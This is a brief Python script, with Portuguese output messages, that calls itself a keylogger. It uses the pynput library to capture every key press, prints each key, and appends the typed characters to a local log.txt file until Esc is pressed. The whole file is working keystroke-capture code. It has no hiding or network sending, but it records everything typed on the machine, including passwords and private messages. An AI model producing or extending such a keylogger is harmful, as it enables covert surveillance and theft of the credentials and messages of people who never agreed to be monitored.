from pynput.keyboard import Key, Listener
from sys import exit

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print('Tecla {} pressionada'.format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('space') > 0:
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

print('Keylogger ouvindo...')
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Saindo do Programa...")
    exit()